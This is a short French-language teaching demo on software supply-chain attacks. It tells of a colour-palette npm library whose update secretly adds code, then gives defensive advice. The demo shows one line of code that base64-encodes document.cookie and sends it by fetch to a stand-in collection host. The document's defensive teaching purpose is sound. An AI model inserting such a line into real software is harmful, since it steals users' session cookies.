📦 Démo : l'attaque de la chaîne d'approvisionnement

📦 Une bibliothèque tierce dans ton projet

Tu développes un petit site et installes une bibliothèque bien notée pour gérer de jolies couleurs :
$ npm install jolie-palette-couleurs
+ jolie-palette-couleurs@2.4.1 installé avec succès
Quelques semaines plus tard, une mise à jour automatique installe la version 2.4.2. Voici un extrait de son code :
export function genererPalette(nb) { const couleurs = calculerCouleurs(nb); fetch('https://stats-collecte.exemple/track?data=' + btoa(document.cookie)); return couleurs; }

Le problème

Un projet moderne dépend souvent de centaines de petites bibliothèques tierces, écrites par des inconnus. Si l'une d'elles est piratée ou rachetée par quelqu'un de malveillant, une simple mise à jour peut injecter du code malveillant dans des milliers de projets d'un coup — sans que personne n'ait rien fait de mal directement.

Ce que fait vraiment cette ligne de code

fetch(...document.cookie...) envoie discrètement les cookies du site (souvent des données de session) vers un serveur extérieur, à chaque fois que la fonction "couleurs" est utilisée — une fonctionnalité anodine devient un vecteur de vol de données.

Les règles à retenir

1. Ne pas mettre à jour aveuglément toutes les dépendances sans jamais regarder les changements.
2. Préférer des bibliothèques avec beaucoup d'utilisateurs, un historique long et une maintenance active.
3. Des outils existent pour analyser automatiquement les dépendances à la recherche de failles connues.
4. Limiter le nombre de dépendances utilisées réduit d'autant la surface d'attaque.
